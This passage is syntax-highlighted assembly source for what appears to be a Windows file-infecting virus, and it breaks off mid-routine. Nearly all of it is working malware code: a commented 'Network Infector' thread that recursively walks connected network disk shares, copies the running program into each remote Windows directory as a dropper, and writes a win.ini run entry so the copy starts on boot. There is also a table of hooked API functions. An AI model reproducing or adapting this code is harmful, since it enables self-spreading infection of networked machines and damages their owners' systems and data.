</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">XDestroyWindow</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_DestroyWindow</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ExitProcess</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Hook_ExitProcess</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">functions_nr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookedFunctions</span><span class="sc4">)/</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the Network Infector</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_6_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread6Delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Thread6Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread6Delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">NETWORKINFECTION</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">netapis</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_netcrawl</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD6SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread6Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NetInfection</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_net</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NetInfection</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc5">lpnr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">lpnrLocal</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">hEnum</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">ceEntries</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">cbBuffer</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_new_delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_new_delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_new_delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ceEntries</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">                 </span><span class="sc1">;as many entries as poss.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cbBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4000</span><span class="sc0">                        </span><span class="sc1">;memory buffer size</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hEnum</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;handle to enumeration</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpnr</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;parameter</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">_WNetOpenEnumA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RESOURCE_CONNECTED</span><span class="sc4">,</span><span class="sc0">\ </span><span class="sc1">;open the enumeration</span><span class="sc0">
                           </span><span class="sc5">RESOURCETYPE_ANY</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\   </span><span class="sc1">;</span><span class="sc0">
                           </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;failed?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_net</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">_GlobalAlloc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GPTR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cbBuffer</span><span class="sc0">     </span><span class="sc1">;allocate memory</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_net</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpnrLocal</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;save memory handle</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">enumerate</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cbBuffer</span><span class="sc0">                           </span><span class="sc1">;enumerate all the</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;resources</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpnrLocal</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ceEntries</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hEnum</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">_WNetEnumResourceA</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;failed?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">free_mem</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ceEntries</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;how many entries?</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">enumerate</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">roam_net</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.dwType</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;is it a disk resource?</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RESOURCETYPE_DISK</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_next_entry</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.lpRemoteName</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;get remote name</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.lpLocalName</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;get local name</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;empty?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_good_name</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0041</span><span class="sc0">                     </span><span class="sc1">;is it a floppy disk?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_good_name</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RemoteInfection</span><span class="sc0">                        </span><span class="sc1">;try to infect it!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_good_name</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.dwUsage</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;do we have a container?</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RESOURCEUSAGE_CONTAINER</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_next_entry</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NetInfection</span><span class="sc0">                           </span><span class="sc1">;recurse!!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_next_entry</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                                </span><span class="sc1">;next resource!</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">roam_net</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">enumerate</span><span class="sc0">                               </span><span class="sc1">;and next enumeration...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">free_mem</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">_GlobalFree</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpnrLocal</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;free the memory</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">_WNetCloseEnum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hEnum</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;and close enumeration.</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exit_net</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NetInfection</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RemoteInfection</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@___1</span><span class="sc0">                                  </span><span class="sc1">;restore the delta handle</span><span class="sc0">
</span><span class="sc5">@___1</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@___1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;get the current file</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">myname</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;name</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetModuleFileNameA</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">cannot_roam</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">windirs</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;point windows dir names</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">test_paths</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">droppername</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;copy path for dropper</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcpy</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">winininame</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;copy path for win.ini</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcpy</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">droppername</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;copy windows dir</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">drop</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;and dropper name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                                   </span><span class="sc1">;now copy ourself over</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;the LAN under the new</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">myname</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;name into the remote</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;windows directory</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CopyFileA</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">test_next</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">winininame</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;copy the windows dir name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;to the win.ini path</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">winini</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;and it's name</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">winininame</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;Now create this entry</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;into the win.ini file:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">droppername</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;[Windows]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cmd</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;run=c:\windows\ramm.exe</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
